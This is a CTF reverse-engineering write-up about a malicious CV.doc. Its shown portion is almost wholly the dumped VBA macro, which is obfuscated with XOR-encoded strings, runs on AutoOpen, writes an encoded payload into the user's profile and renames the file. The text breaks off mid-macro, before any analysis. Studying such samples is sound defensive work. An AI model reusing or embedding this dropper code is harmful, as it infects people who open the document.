---
title: "Writeup Cyber Threat Force : The document is strange"
date: 2021-07-10T17:45:09+01:00
draft: false
tags: ["blog", "security", "ctf", "cyber-threat-force", "reverse"]
type: "posts"
showDate: true
---

For this challenge, we were given a `CV.doc` document. Opening it reveals a pretty normal looking resume template, and a warning about macros from LibreOffice.

Using the macros menu, we can dump their code:

<!--more-->

```vba
Rem Attribute VBA_ModuleType=VBAModule
Option VBASupport 1
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long

Private Function xDSnawULVynR(lyOFjkCBqpsZ As Variant, gGuJOMcorXqH As Variant)
    Dim ZtYIpNgiqDdm As String
    ZtYIpNgiqDdm = ""
    For i = LBound(lyOFjkCBqpsZ) To UBound(lyOFjkCBqpsZ)
        ZtYIpNgiqDdm = ZtYIpNgiqDdm & Chr(gGuJOMcorXqH(i) Xor lyOFjkCBqpsZ(i))
    Next
    xDSnawULVynR = ZtYIpNgiqDdm
End Function
Sub IAjgEYdgKhtjY()
    fVKsxPMRAauvNsO
End Sub
Sub AutoOpen()
    fVKsxPMRAauvNsO
End Sub
Sub fVKsxPMRAauvNsO()
    Sleep (((2063 - 354) + (554 - 263)))
    LwvYeveWxaeE
    zrOxbjsXpxFIZ
    XEFxqSzaXCXvSAp
End Sub
Sub LwvYeveWxaeE()
    Dim vboXZZvyMJBot As String
    Dim hfBGMlrCyHeaK As String
    Dim dWlVcYnsGQco As String
    Dim EdVSmtRqwXYTGM As String
    Dim yyEWNYbuXurxW As String
    Dim MwIMnegwljrXk As String
    vboXZZvyMJBot = xDSnawULVynR(Array(229, (397 - 156), (29 + 138), 179, 26, (6 - 0), (297 - 93), 9, 187, ((146 - 17) Xor (20 - 1)), (125 + (101 - 31)), 46, 72, 196, (53 Xor 190)), Array(175, (161 Xor 17), ((225 - 24) + 28), (141 + 85), ((133 - 47) + 5), (103 - 25), ((115 - 32) Xor 214), (69 Xor 13), (138 + (116 - 37)), (190 + 39), (34 Xor (256 - 93)), ((71 - 28) Xor (57 + 54)), (2 + 7), (74 Xor 203), (52 + 139))) & _
                    xDSnawULVynR(Array(((209 - 92) + 121), ((112 - 55) Xor 76), 148, 89, 12, ((7 - 1) + (30 - 4)), ((4 - 0) + 4), ((52 + 168) Xor (108 - 50)), ((0 - 0) Xor 9), (8 Xor 111), (1 Xor ((30 - 9) + 14)), 69, 184, 230, ((18 - 3) + 144)), Array(((111 - 37) Xor 229), 44, 197, (47 - 20), (198 - 78), ((123 - 52) Xor (4 + 34)), 79, 179, 72, (15 + (53 - 22)), (124 - 25), (8 - 4), 129, 167, (((97 - 25) + (7 - 2)) Xor (88 + 57)))) & _
                    xDSnawULVynR(Array((20 Xor (89 - 26)), (((13 - 4) + 125) Xor 109), 175, (397 - 174), (43 - 7), 221, 79, (13 Xor 49), (97 Xor (209 - 40)), ((38 + 135) Xor (39 + 66)), 66, (203 - 75), (236 Xor (12 + 4)), (40 + 181), 147), Array((175 - 69), 170, ((281 - 106) + 55), 184, ((103 - 43) Xor (1 + 89)), ((205 - 39) Xor (5 + (13 - 6))), (14 + (0 - 0)), 123, 141, (249 - 116), (((3 - 1) + 1) Xor 37), 193, 190, (71 + (112 - 0)), (40 Xor (62 + 188)))) & _
                    xDSnawULVynR(Array(13, (85 Xor 32), (((61 - 28) + 28) Xor 103), 179, ((41 + (23 - 5)) Xor (287 - 122)), (158 - 28), ((18 - 7) + 228), 157, ((281 - 86) Xor (12 + 19)), (28 Xor (18 + 15)), (57 - 19), (93 Xor 149), 25, (96 - 33), 7), Array((16 Xor (125 - 35)), (10 + 8), (20 + (9 - 2)), (((185 - 92) + 30) Xor 132), (59 Xor (385 - 191)), 192, 131, (293 - 73), (261 - 113), 90, (118 - 15), (47 + (157 - 58)), (48 Xor ((90 - 37) + 67)), (31 Xor (34 + (110 - 47))), ((46 - 15) Xor 113))) & _
                    xDSnawULVynR(Array((25 - 8), (14 Xor 73), 225, 52, (12 - 5), 224, (16 - 5), 152, 167, (7 Xor 255), ((18 + 0) Xor 50), ((28 + 2) Xor 54), ((59 - 18) + (14 - 7)), 110, (((10 - 2) + 58) Xor (286 - 90))), Array((72 Xor (30 - 6)), (6 Xor 0), (((152 - 75) + (241 - 116)) Xor (38 - 11)), (33 + (157 - 73)), (14 Xor 74), 135, (142 - 68), (51 Xor (210 - 18)), (168 + 62), ((14 + 72) Xor 232), (108 - 41), (138 - 33), 106, ((1 + 41) Xor (24 - 3)), ((55 + (39 - 13)) Xor 149))) & _
                    xDSnawULVynR(Array(72, (192 Xor 52), 218, (319 - 134), 50, ((28 - 9) + 185), (149 - 64), (159 - 24), (26 + 42), (238 - 61), 109, (49 + 151), ((211 - 37) Xor 79), ((80 - 33) + 36), (97 Xor (315 - 105))), Array(33, ((92 - 28) + (197 - 80)), 159, (162 Xor 66), 115, ((26 + 24) Xor 159), (6 - 2), (147 Xor 86), 55, ((44 + 54) Xor ((175 - 68) + 39)), ((28 - 14) Xor (23 + (19 - 6))), (20 + 137), ((36 - 4) Xor 128), 26, ((30 + 187) Xor (7 + 36)))) & _
                    xDSnawULVynR(Array((1 + 6), 9, (51 Xor (193 - 36)), (9 Xor ((205 - 76) + 55)), 218, 1, 45, 231, ((132 - 13) Xor (303 - 69)), 77, ((148 - 30) Xor (263 - 111)), 113, 126, 235, (303 - 64)), Array((113 - 43), (44 + (4 - 0)), ((142 - 65) Xor 162), 242, 155, 64, (10 + 90), ((8 + 61) Xor (98 + 99)), ((178 - 78) Xor 187), (4 + 30), (253 - 78), ((3 - 0) + 54), 47, (67 + 103), 139)) & _
                    xDSnawULVynR(Array(((26 - 3) + 131), (70 + 18), (70 Xor 29), (396 - 185), 196, 96, (90 Xor 219), ((84 - 8) Xor (36 - 12)), 134, 43, (288 - 84), (182 - 58), 96, 140, (((64 - 17) + 53) Xor 178)), Array((8 Xor 211), ((21 - 3) + (16 - 8)), (53 - 9), 146, ((13 - 0) + 115), 15, (212 - 20), (20 Xor (10 + 2)), (412 - 171), (102 + (4 - 0)), (328 - 142), (115 - 54), 36, (64 Xor (188 - 51)), (149 Xor (1 + 1)))) & _
                    xDSnawULVynR(Array((20 Xor (5 + (63 - 22))), (26 Xor 48), ((5 + 3) Xor 145), (((193 - 96) + (12 - 2)) Xor (237 - 36)), (22 + 181), (92 - 22), (5 Xor 60), ((135 + 12) Xor 88), (179 - 84), (6 Xor (211 - 98)), 138, ((135 - 6) Xor 94), (9 Xor (21 + (16 - 4))), (((0 - 0) + (0 - 0)) Xor 1), (196 - 40)), Array((5 Xor 113), 123, (173 Xor 117), (74 + 145), 138, 5, (0 + 13), (173 - 35), 18, (10 + 6), (260 - 57), (116 Xor (266 - 56)), (65 Xor 40), 69, (437 - 186))) & _
                    xDSnawULVynR(Array(((7 + 2) Xor (344 - 163)), (232 - 104), 33, (108 Xor (105 + 35)), ((50 - 6) Xor ((85 - 29) + 12)), ((53 - 10) Xor 150), 102, 198, (((85 - 15) + (23 - 11)) Xor 255), (20 Xor (58 + (79 - 20))), ((2 + (1 - 0)) Xor (21 + (12 - 3))), (76 + 28), (190 + 29), (((8 - 4) + 3) Xor 40), 126), Array(253, (343 - 139), 70, (300 - 139), (23 - 7), (162 Xor (21 + 73)), 34, 139, (139 Xor (160 - 57)), 44, 106, (48 - 7), 174, 110, (113 - 55))) & _
                    xDSnawULVynR(Array(((25 - 7) Xor (143 + 13))), Array(((81 - 36) + (233 - 63))))
    hfBGMlrCyHeaK = xDSnawULVynR(Array((127 Xor 239), (9 Xor (33 + 30)), 238, (145 + (95 - 30)), 72, (137 + 42), (1 + 67), (8 + 14), 17, (1 Xor 98), ((4 - 1) + (14 - 6)), (32 + 125), (40 + 1), 142, 205), Array((82 Xor 131), ((76 - 22) Xor (120 - 41)), ((0 + 0) Xor 175), 147, (74 - 12), (180 + 62), 7, 71, 80, (24 + 30), 74, (407 - 184), 80, (127 + 80), 138)) & _
                    xDSnawULVynR(Array(81, (196 Xor 38), (86 - 38), ((16 + 84) Xor (49 + (208 - 89))), 97, 91, ((175 - 43) Xor 2), (98 + 56), 89, (102 + 122), (44 + (69 - 30)), 79, (35 Xor 21), ((246 - 118) + (111 - 29)), 219), Array((12 + 93), 163, (25 + (87 - 7)), ((188 - 62) Xor 197), ((27 + (3 - 1)) Xor 62), (3 + 17), (173 + 26), ((62 + (5 - 0)) Xor 158), 28, (80 + 81), (((37 - 8) + (28 - 12)) Xor 28), 30, (113 Xor 5), ((89 - 29) Xor ((96 - 46) + 80)), 154)) & _
                    xDSnawULVynR(Array(227, (436 - 214), 176, 93, (319 - 153), (72 Xor 57), (132 - 21), (130 - 63), ((365 - 169) Xor 28), (146 - 36), (146 + 37), (46 - 4), (((70 - 24) + 18) Xor (0 - 0)), ((112 - 10) + 92), (38 + 2)), Array((105 Xor 201), 151, (94 + 147), 25, 247, (45 + (4 - 1)), 36, (4 - 2), (78 Xor 213), 47, (231 Xor (11 + 6)), (((60 - 4) + 38) Xor ((45 - 12) + 15)), (8 Xor (19 + (6 - 0))), 131, (117 - 18))) & _
                    xDSnawULVynR(Array((120 - 7), 1, (8 Xor 214), (((50 - 19) + 173) Xor 23), (89 Xor 204), (60 Xor (267 - 126)), 12, (85 Xor (8 + (246 - 61))), 85, ((4 - 1) Xor ((2 - 1) + 4)), (((14 - 0) + (2 - 1)) Xor (156 - 46)), (31 Xor (313 - 85)), 37, 204, (((181 - 77) + 25) Xor 76)), Array((3 + 45), ((35 - 14) + 45), ((114 - 26) Xor (53 + 172)), (221 - 67), ((165 - 77) Xor (51 + 102)), (127 + 87), ((72 - 19) + 25), (54 Xor (142 + 64)), (20 Xor 0), 78, 2, 186, (133 - 28), (198 - 41), (211 - 68))) & _
                    xDSnawULVynR(Array(((0 - 0) + 152), 129, 173, (18 Xor 7), ((162 - 17) + (12 - 0)), (146 + 83), 219, ((4 + 16) Xor (342 - 142)), (15 + (13 - 4)), ((33 - 13) + 174), (176 - 88), ((104 - 7) Xor 184), 248, (34 + (33 - 9)), (184 Xor 123)), Array((333 - 133), (((126 - 60) + 23) Xor 153), (122 + 112), (54 Xor 106), 220, (11 Xor (156 - 13)), (72 Xor (187 + 57)), ((29 + 37) Xor (152 + 68)), ((31 - 12) + 97), ((169 - 62) + 24), 31, 148, ((121 + (108 - 48)) Xor (12 - 0)), (85 + 9), (122 Xor 248))) & _
                    xDSnawULVynR(Array((8 Xor (0 + 1)), 139, (110 - 12), (50 - 10), (409 - 154), (68 - 27), 86, 17, 125, 240, ((20 - 2) Xor (8 - 4)), ((186 - 89) + 11), (99 + 56), 11, 64), Array((((38 - 10) + 14) Xor 98), (232 Xor (3 + 1)), 35, 110, 178, 104, (25 + 26), 64, (64 - 1), ((42 + 70) Xor 250), 87, (15 + 21), 202, 74, (20 + (8 - 2)))) & _
                    xDSnawULVynR(Array(((20 + 70) Xor (168 + (75 - 24))), (1 + (28 - 13)), ((7 + (21 - 10)) Xor (26 + 17)), 44, 117, 136, (218 - 33), 186, (41 + 27), ((141 - 47) Xor (102 + (159 - 46))), ((82 - 17) + 69), (218 - 37), (283 - 140), (2 + (28 - 11)), 224), Array(((39 + (22 - 10)) Xor 227), (141 - 59), ((95 - 45) + 27), (47 + (84 - 22)), (83 - 29), ((24 + 37) Xor 129), (289 - 41), (41 Xor (139 + 60)), (3 + 32), ((17 + 85) Xor ((202 - 65) + (70 - 34))), ((7 + 26) Xor 203), 244, (106 Xor (79 + 94)), (73 - 7), (314 - 153))) & _
                    xDSnawULVynR(Array(((85 - 9) Xor 26), (94 Xor ((80 - 40) + 6)), (234 - 70), (99 + 156), ((3 - 1) Xor 92), 21, (((129 - 50) + 53) Xor 86), (351 - 128), 189, (75 + 21), 245, ((81 - 0) Xor (97 + (39 - 3))), (8 Xor 177), (((114 - 4) + 117) Xor 19), 222), Array(26, (21 Xor (2 + 0)), 230, ((128 - 17) + 56), ((9 + 22) Xor 0), (63 + (36 - 17)), 135, ((118 - 41) Xor (181 + (51 - 21))), 228, ((0 - 0) + 7), ((294 - 143) Xor 32), 144, (349 - 101), (158 Xor (78 - 37)), (290 - 121))) & _
                    xDSnawULVynR(Array(106, ((216 + 28) Xor (4 + 9)), (294 - 108), ((184 - 89) + 60), 221, (56 Xor 225), 159, (73 - 20), 104, ((281 - 106) Xor (89 + (24 - 6))), (((134 - 43) + (15 - 7)) Xor 247), (39 + 5), 143, ((169 - 3) + 14), (125 - 23)), Array(43, (156 - 4), ((205 - 59) + 89), (80 + (243 - 106)), ((82 - 14) Xor 245), (41 + 111), 216, 1, (78 - 37), (109 + (99 - 48)), (((10 - 5) + 60) Xor (114 + (53 - 19))), 109, ((74 + (135 - 11)) Xor 57), (88 + 157), ((31 - 7) Xor 61))) & _
                    xDSnawULVynR(Array(((72 + 42) Xor 0), 166, (12 + 11), 169, (169 Xor (140 - 28)), 217, ((74 - 2) Xor 61), 19, (60 - 28), (((1 - 0) + 0) Xor 4), 13, 64, ((3 + (0 - 0)) Xor 29), (((53 - 4) + (24 - 7)) Xor 156)), Array(70, (441 - 210), (127 - 58), (244 - 12), 155, 175, (23 Xor (21 + 14)), (53 Xor 110), 67, (((25 - 5) + 3) Xor (163 - 80)), ((20 + 5) Xor 118), (33 + 6), (97 - 5), (13 Xor 160)))
    dWlVcYnsGQco = xDSnawULVynR(Array(((150 - 53) Xor 248), (42 - 19), 18, ((222 - 41) + 27), (37 - 13), 204, (((71 - 28) + 65) Xor ((156 - 21) + 13)), (130 Xor 42), 98, ((30 + 12) Xor 134), 107, ((146 - 65) + 123), 31, (158 + (86 - 19)), (100 + 57)), Array(216, (33 Xor (0 + (221 - 108))), ((55 - 18) + 5), (195 - 50), (103 - 38), (31 + 126), 186, (144 + 51), 35, 233, 50, (37 Xor 168), ((135 - 21) Xor 12), 176, (138 + 85))) & _
                    xDSnawULVynR(Array(223, 69, 33, (103 - 31), (70 Xor 18), 146, (16 Xor 185), 21, (27 - 4), (12 + 8), 124, ((37 - 13) Xor (158 - 39)), ((222 - 97) Xor 148), 30, (84 Xor 56)), Array(172, (2 Xor 6), (101 Xor (1 + 2)), (23 + 6), 21, (44 Xor 245), (198 + 34), (38 Xor ((66 - 11) + 59)), ((174 - 86) Xor (55 - 19)), (88 - 3), (50 Xor (4 + (7 - 3))), 12, 168, 68, 61)) & _
                    xDSnawULVynR(Array(52, 92, 235, (311 - 122), 12, ((78 + 43) Xor (73 + (72 - 5))), ((65 - 9) Xor 181), 73, ((62 - 16) + 30), (101 - 21), 198, (32 + (166 - 79)), ((46 - 16) Xor ((277 - 87) + 26)), (6 + 29), (37 + (109 - 43))), Array((155 - 37), (33 Xor 20), 170, ((4 + 0) Xor 252), ((27 - 6) + 64), (177 + 3), (130 Xor 110), 24, 14, ((29 - 7) + 13), (234 - 99), ((18 + 1) Xor (18 + 17)), 147, (60 Xor (35 + 59)), (36 Xor (5 + 10)))) & _
                    xDSnawULVynR(Array((505 - 251), 102, ((162 - 41) Xor 173), (11 + 135), (((15 - 3) + (17 - 7)) Xor (73 - 28)), (76 Xor (140 + 90)), 34, (17 Xor 41), (246 - 82), (84 - 30), 182, 112, (92 Xor 37), (216 + (40 - 19)), (188 + 18)), Array((234 - 43), (0 Xor (3 + (62 - 26))), 189, 211, (68 + 52), 251, 99, (174 - 76), (187 + 58), 116, (100 Xor 167), (29 + 20), ((13 + (19 - 6)) Xor (78 - 35)), (314 - 134), 143)) & _
                    xDSnawULVynR(Array(((68 - 22) Xor (61 - 30)), ((22 - 4) + 167), (77 + 53), 47, (1 + 0), (5 Xor (0 + 122)), (372 - 169), (5 + (12 - 2)), 117, 219, (270 - 129), ((112 - 52) + 111), 90, ((223 - 105) + 9), 229), Array(126, (22 Xor ((78 - 4) + 126)), 192, (16 + (125 - 32)), (65 - 1), ((39 - 11) Xor (38 - 1)), (271 - 133), (12 Xor 66), 32, ((12 + 10) Xor 140), (307 - 100), 238, (16 + 11), (16 Xor (71 - 29)), (83 + (125 - 48)))) & _
                    xDSnawULVynR(Array((22 + 3), 178, (212 - 62), (343 - 95), ((67 - 18) + (58 - 15)), 78, (300 - 88), (5 + 1), ((3 + (92 - 40)) Xor 164), (((91 - 22) + 38) Xor 5), (((21 - 2) + 39) Xor 255), 178, (5 Xor 22), (254 - 78), (287 - 103)), Array(88, (220 Xor ((50 - 14) + 20)), (23 + 192), (101 + 85), 30, 15, 146, ((81 - 3) + (39 - 4)), (132 + 78), (67 - 31), (177 - 45), 240, 66, 241, (406 - 166))) & _
                    xDSnawULVynR(Array((4 + 199), (168 + (54 - 21)), 84, (10 + 94), (162 + 15), (98 - 12), (4 Xor 58), (54 + 125), (171 - 30), ((143 + (9 - 3)) Xor (66 + 49)), ((0 + 0) Xor (0 - 0)), (301 - 105), (317 - 130), (18 + (271 - 70)), (8 Xor (128 - 24))), Array((115 + (18 - 3)), ((93 + 33) Xor 246), (45 + 9), (50 - 19), 243, 60, ((91 + (38 - 17)) Xor (29 - 14)), ((90 + 123) Xor 35), (108 Xor ((140 - 46) + (126 - 7))), 167, (150 - 61), 149, (444 - 195), (92 + 83), ((20 - 7) + 20))) & _
                    xDSnawULVynR(Array((9 + 94), ((78 + 52) Xor ((4 - 2) + 2)), 69, 116, ((12 - 4) Xor (10 + 14)), 120, (380 - 145), 17, 248, 44, ((101 - 38) + (47 - 18)), ((72 - 32) Xor 20), (0 Xor 0), 132, 186), Array(((31 - 6) + (14 - 7)), (193 Xor (20 - 2)), ((2 - 0) + (2 - 0)), 61, (98 Xor 21), 57, 155, (22 Xor 70), ((193 - 38) + 30), ((5 - 1) Xor 24), ((19 - 9) + 19), (165 - 38), 103, (80 + (125 - 7)), (77 + (189 - 28)))) & _
                    xDSnawULVynR(Array(15, ((38 + 92) Xor (52 + 26)), 224, 195, ((59 - 18) Xor 149), 2, (218 - 96), (107 + 95), 192, (10 + 232), 75, (3 Xor ((50 - 2) + 22)), 113, 216, (210 Xor 51)), Array(((74 - 34) + 38), (245 - 113), 177, (73 + 57), (83 Xor ((84 - 33) + 131)), ((81 - 27) + 29), 56, (93 Xor (252 - 14)), 129, (118 + 68), ((11 + 14) Xor (0 + 3)), (6 - 2), (42 + (36 - 17)), 137, 163)) & _
                    xDSnawULVynR(Array((167 Xor 64), 213), Array((140 Xor 58), ((203 - 85) + 30)))
    EdVSmtRqwXYTGM = xDSnawULVynR(Array((130 Xor (182 - 91)), (33 + 3), (20 - 5), ((305 - 111) Xor 9), 222, 129, 68, ((3 + 0) Xor 5), (137 - 60), 171, 245, 75, (166 - 64), (214 - 49), 43), Array(((119 - 31) Xor 201), 109, 78, 169, 169, (199 - 4), ((35 + 2) Xor (9 + 2)), ((0 + 0) Xor (46 + 25)), (3 Xor (9 - 0)), 254, (291 - 111), 40, (7 Xor (31 - 9)), ((330 - 123) Xor 40), (69 + 12))) & _
                    xDSnawULVynR(Array((10 - 3), 44, 241, 39, 99, ((34 - 16) Xor (18 - 7)), 0, 226, (120 Xor ((78 - 31) + 192)), ((4 - 2) Xor (11 + 9)), 111, (211 - 62), 104, ((25 + (66 - 8)) Xor (2 + (6 - 2))), 185), Array(70, (90 Xor 53), ((102 + 50) Xor (32 + 8)), ((14 - 3) Xor 109), (37 + 3), ((98 - 13) + 3), (76 - 11), (91 + (56 - 8)), ((244 - 53) Xor (87 + (21 - 3))), ((4 + 4) Xor (23 + 70)), 62, (109 Xor (280 - 95)), 50, ((6 - 2) Xor 0), (342 - 91))) & _
                    xDSnawULVynR(Array((33 + 79), ((67 - 8) + 181), ((12 - 3) + 84), (242 - 30), (146 - 2), 138, (131 - 44), (69 Xor 30), ((73 - 2) + 161), (408 - 190), 54, (73 Xor (211 + (20 - 6))), (84 Xor 201), (16 Xor ((17 - 2) + 27)), (212 + 30)), Array(((2 - 0) + (4 - 1)), ((186 - 32) Xor (58 - 15)), (16 Xor 5), 141, (134 Xor (132 - 45)), 197, 48, ((17 - 5) Xor (8 + 13)), ((99 - 9) + 80), 155, (56 Xor (143 - 71)), (316 - 83), 220, ((0 + (51 - 10)) Xor (124 - 54)), ((9 + 9) Xor 161))) & _
                    xDSnawULVynR(Array((175 - 45), (168 Xor 69), 251, 243, 55, (140 + (12 - 6)), ((106 - 18) Xor 48), 250, 124, (95 Xor (230 + 11)), (0 + 1), (65 Xor 33), 98, (25 + 4), (161 + 73)), Array((242 - 50), ((51 + (147 - 66)) Xor 44), 186, ((163 - 28) Xor 49), (68 + 46), 211, ((87 - 28) Xor 5), ((2 + (28 - 4)) Xor (139 + 22)), (28 Xor (34 + 0)), ((126 - 52) Xor 166), (35 + (57 - 28)), 38, (12 Xor 25), 92, (235 - 75))) & _
                    xDSnawULVynR(Array((93 - 27), (83 + 39), 159, (29 + 142), 132, (430 - 192), (58 - 29), ((59 - 28) + (151 - 4)), ((96 - 20) + 110), (422 - 199), ((46 - 23) + 16), ((420 - 201) Xor (4 + 1)), (27 + 49), 96, (28 - 13)), Array((0 Xor 3), ((48 - 21) Xor 35), (223 - 17), (134 + (122 - 22)), (74 + 130), 167, (36 + (87 - 31)), 208, (118 + (159 - 72)), (208 - 51), 77, 159, (15 - 6), (156 - 72), (3 Xor 77))) & _
                    xDSnawULVynR(Array((0 + (14 - 2)), (37 Xor (30 - 3)), 145, 136, ((31 - 4) Xor (59 + 3)), (342 - 126), (206 + 48), ((145 - 29) Xor (144 + (100 - 43))), (71 Xor 57), (241 - 116), 177, ((37 - 5) Xor 102), ((150 - 42) Xor 142), 129, ((297 - 144) Xor ((107 - 39) + 21))), Array(((15 + 0) Xor (111 - 21)), ((80 - 24) Xor 87), 211, ((236 - 74) + 90), (159 - 59), ((21 + (77 - 28)) Xor ((224 - 54) + 47)), 171, (420 - 168), (15 + 40), (1 + 25), 240, (16 + 38), (221 - 58), ((304 - 142) Xor 98), 253)) & _
                    xDSnawULVynR(Array(77), Array((9 Xor 121)))
    yyEWNYbuXurxW = vboXZZvyMJBot + hfBGMlrCyHeaK + dWlVcYnsGQco + EdVSmtRqwXYTGM
    MwIMnegwljrXk = xDSnawULVynR(Array(245, (7 Xor (133 - 23)), 82, (85 + 39), ((129 - 58) Xor ((38 - 13) + 153)), 140, (15 - 1), 62, 221, (47 Xor 247), (64 Xor 14), ((25 + (61 - 26)) Xor 158), (112 - 45), 24, 122), Array((109 Xor 232), (1 Xor 7), ((1 + 0) Xor 36), (((1 - 0) + 0) Xor 24), (1 + 134), (390 - 135), 102, ((129 - 42) + (7 - 3)), ((19 + (106 - 14)) Xor 222), 180, 96, ((98 - 21) Xor 138), (29 Xor (13 + 25)), 125, 90)) & _
                    xDSnawULVynR(Array((317 - 86), 89, (39 - 17), 222, (119 - 41), (17 Xor (263 - 90)), (1 Xor 21), 78, 116, (37 + (242 - 106)), ((14 - 1) + 19), (52 + 28), 91, 32, 78), Array((164 Xor (214 - 104)), ((13 - 5) Xor 52), ((3 + 3) Xor 104), 187, 45, (92 Xor (318 - 126)), (229 - 111), (1 + (104 - 50)), (4 - 0), (318 - 114), (132 - 49), 35, (60 Xor 71), 13, (13 Xor (22 + 16)))) & _
                    xDSnawULVynR(Array((177 - 67), (174 + 70), (105 + 86)), Array((0 Xor ((0 - 0) + (0 - 0))), ((4 + (4 - 2)) Xor (67 + (83 - 5))), ((172 - 54) + (75 - 34)))) + yyEWNYbuXurxW
    Dim BotaCipUCROa As String
    Dim qgCHXadDjflv As String
    BotaCipUCROa = Application.UserName
    qgCHXadDjflv = xDSnawULVynR(Array((181 Xor (28 - 14)), (255 - 5), 55, (7 + 235), (84 - 7), 174, ((94 - 24) + 23), (260 - 15), (5 + (75 - 11))), Array((221 + 27), 192, ((107 - 43) + 43), ((116 - 55) Xor (242 - 88)), ((103 - 49) Xor 8), (293 - 90), ((12 - 6) Xor 41), (47 Xor (81 + (150 - 62))), (43 - 18))) + BotaCipUCROa + xDSnawULVynR(Array(((9 + 2) Xor 211), (84 Xor ((1 - 0) + 46)), ((44 - 1) Xor 157), 196, (87 + (79 - 3)), 227, ((108 - 12) Xor 3), 77, (((28 - 7) + 9) Xor 62), (184 - 9), (89 - 37), 191, 140, 174, 81), Array(((27 + (94 - 46)) Xor (192 + 15)), (13 + 45), (58 + 140), (348 - 168), 231, (45 + (168 - 83)), (((11 - 2) + 7) Xor (5 + (2 - 0))), (42 Xor 6), 124, (436 - 209), (73 + 18), (72 Xor (86 + 62)), (145 Xor (149 - 25)), ((73 - 31) + (290 - 138)), (0 Xor 13))) & _
                   xDSnawULVynR(Array((474 - 234), 5, (345 - 131), 41, (26 + 91), 179, (95 - 38), (184 - 35), (67 Xor ((6 - 3) + 15)), 241, (106 - 49), (67 - 9), (135 - 36), 99, (2 Xor (0 + (0 - 0)))), Array(164, (92 + 4), (159 + 28), (40 + 49), ((17 - 2) + 26), (364 - 141), (13 Xor 85), (109 Xor 141), (53 + (20 - 10)), 146, 81, (72 + 23), (11 + 6), (134 - 53), 44)) & _
                   xDSnawULVynR(Array(35, ((2 - 0) + 91), ((10 - 3) + 49)), Array(87, ((5 + (3 - 0)) Xor 45), 76))
    Dim OWbxyThhGwxilR As Object
    Set OWbxyThhGwxilR = CreateObject(xDSnawULVynR(Array(79, (76 Xor (8 + (30 - 13))), (104 - 44), (101 - 11), ((81 - 34) + 79), ((124 - 43) + 56), (51 - 11), 147, (24 Xor 5), (25 Xor ((42 - 13) + 96)), 45, 89, 183, 97, (243 - 40)), Array((44 - 16), (7 Xor (94 - 45)), 78, (3 Xor 48), ((12 - 6) + 8), ((184 + 66) Xor ((4 - 2) + 5)), (72 - 7), ((26 + 1) Xor ((132 - 62) + (230 - 70))), (38 + 84), (61 Xor 119), 107, ((13 + (44 - 15)) Xor 26), (193 + (52 - 26)), 4, ((206 - 68) + 14))) & _
        xDSnawULVynR(Array((86 + 23), (3 + 8), (343 - 110), 72, (14 + 65), ((168 - 61) Xor 242), 143, (((73 - 32) + 71) Xor ((164 - 61) + (165 - 40))), (353 - 131), (153 - 39), 45), Array((19 + 1), (183 - 63), (16 + (144 - 3)), (((4 - 0) + (0 - 0)) Xor 41), (24 + 10), 214, 237, (65 + 189), ((61 - 12) + (165 - 27)), 17, 89)))
    Dim nThptKQUsbXIUwo As Object
    Set nThptKQUsbXIUwo = OWbxyThhGwxilR.CreateTextFile(qgCHXadDjflv)
    nThptKQUsbXIUwo.Write MwIMnegwljrXk
End Sub
Sub zrOxbjsXpxFIZ()
    Dim rxarQjcLRAXXw As String
    Dim BotaCipUCROa As String
    Dim ATxXjGhAEyQcaRJ As String
    BotaCipUCROa = Application.UserName
    rxarQjcLRAXXw = xDSnawULVynR(Array(((157 - 42) + (135 - 62)), (0 - 0), (51 Xor ((190 - 58) + (86 - 39))), (176 - 63), ((34 - 9) + 4), (54 + 108), 37, (165 + (36 - 16)), ((21 + 7) Xor 140)), Array(255, (34 + (44 - 20)), 220, (15 Xor (58 - 15)), (89 + (41 - 20)), ((340 - 169) Xor ((37 - 7) + 78)), 87, ((36 - 14) + 180), ((17 + 1) Xor 222))) + BotaCipUCROa + xDSnawULVynR(Array((132 Xor (139 - 40)), 246, (1 Xor (44 - 21)), ((13 + 35) Xor (5 - 2)), (25 Xor 234), ((8 - 1) Xor (141 - 59)), (190 - 72), ((5 + 0) Xor ((14 - 4) + 25)), ((210 - 97) + 53), ((64 - 32) Xor ((146 - 30) + (18 - 1))), (28 Xor (61 + 0)), (71 Xor (401 - 168)), 135, (234 - 91), ((2 + 9) Xor (29 + 29))), Array((22 + 165), 183, (159 - 57), 67, (187 - 4), (22 + 30), (2 Xor (0 + 0)), 71, 250, (67 + (282 - 116)), ((26 + 21) Xor 97), (112 Xor 189), (134 Xor (190 - 94)), 227, 109)) & _
                    xDSnawULVynR(Array(162, ((4 - 1) + (12 - 6)), ((4 + 10) Xor ((101 - 40) + 47)), (199 - 62), (((9 - 4) + 5) Xor 7)), Array((363 - 117), (184 - 76), (5 + 10), (376 - 127), 81))
    Dim prqLKrcSwieM As String
    Dim AxpTNmhEQQBv As String
    prqLKrcSwieM = xDSnawULVynR(Array(46, (418 - 180), 197, (87 - 38), 114, ((191 - 66) Xor (84 + 137)), (227 Xor 8), 232, 212, 61, (125 Xor 130), 182, ((9 + 31) Xor 113)), Array((33 + (66 - 33)), 143, 176, (93 + 2), 17, ((275 - 80) Xor (4 + 7)), 142, (((30 - 14) + 0) Xor (57 + (129 - 48))), ((64 - 6) + 172), 19, (51 + 88), 206, (19 + 26)))
    AxpTNmhEQQBv = xDSnawULVynR(Array(((123 - 59) + (21 - 7)), (29 + 36), (14 + (109 - 49)), (2 + 130), ((29 + 97) Xor 244), ((25 - 6) Xor 13), ((75 + 13) Xor (206 - 60)), ((62 - 9) Xor (77 + (62 - 10))), 172, (54 Xor 81), 192, (38 Xor 132), (128 - 27)), Array((2 + 32), 32, 63, (68 Xor 174), (171 Xor 66), 118, 175, (142 Xor 72), (61 + (105 - 8)), 73, (37 + (141 - 16)), (183 Xor (197 - 81)), ((6 - 0) + 11)))
    Name rxarQjcLRAXXw & prqLKrcSwieM As rxarQjcLRAXXw & AxpTNmhEQQBv
End Sub
Sub XEFxqSzaXCXvSAp()
    Dim BotaCipUCROa As String
    Dim qgCHXadDjflv As String
    BotaCipUCROa = Application.UserName
